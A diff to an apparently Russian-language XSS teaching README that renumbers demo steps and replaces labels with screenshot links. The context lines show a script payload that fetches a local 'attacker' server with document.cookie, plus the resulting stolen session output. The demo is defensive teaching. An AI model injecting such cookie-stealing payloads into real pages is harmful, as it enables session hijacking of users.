@@ -40,17 +40,17 @@ node attacker.js # http://localhost:4000
 <script>fetch('http://localhost:4000/steal?cookie=' + document.cookie)</script>
 ```
 
-1. Нажать **textContent (safe)** — скрипт отобразится как текст, ничего не выполнится
+3. Нажать **textContent (safe)** — скрипт отобразится как текст, ничего не выполнится
 
-safe
+![](./images/image1.png)
 
-1. Нажать **innerHTML (unsafe)** — скрипт выполнится, в терминале `attacker.js`:
+4. Нажать **innerHTML (unsafe)** — скрипт выполнится, в терминале `attacker.js`:
 
 ```
 [STOLEN] { cookie: 'session=abc123' }
 ```
 
-unsafe
+![](./images/image2.png)
 
 ## Защита
 
